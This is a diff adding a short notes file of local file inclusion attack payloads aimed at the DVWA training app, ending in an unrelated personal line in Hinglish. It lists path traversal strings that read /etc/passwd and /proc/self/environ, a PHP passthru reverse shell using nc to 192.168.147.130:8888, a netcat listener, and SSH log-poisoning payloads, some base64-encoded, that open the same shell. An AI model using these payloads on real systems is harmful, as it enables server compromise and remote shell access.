@@ -1,0 +1,23 @@
+LFI
+
+/var/www/dvwa/vulnerabilities/fi/include.php
+../../../../../etc/passwd
+../../../../../proc/self/environ
+
+<?phpinfo();?>
+
+<?passthru("nc -c /bin/sh 192.168.147.130 8888")?>
+
+nc -vv -l -p 8888
+
+
+ssh "(<?passthru(base64_decode('nc -c /bin/sh {atacker_IP} {attacker_PORT}'));?>)"@Victim_ip
+
+ssh "<?passthru(base64_decode('nc -c /bin/sh 192.168.147.130 8888'));?>"@192.168.147.131
+
+ssh "<?passthru(base64_decode('bmMgLWMgL2Jpbi9zaCAxOTIuMTY4LjE0Ny4xMzAgODg4OA=='));?>"@192.168.147.131
+
+ssh "php -r '<?php passthru(base64_decode(\"bmMgLWMgL2Jpbi9zaCAxOTIuMTY4LjE0Ny4xMzAgODg4OA==\")); ?>'@192.168.147.131
+
+
+hi this is sanskar kya yrr dimag too samne wali larki ghumma 
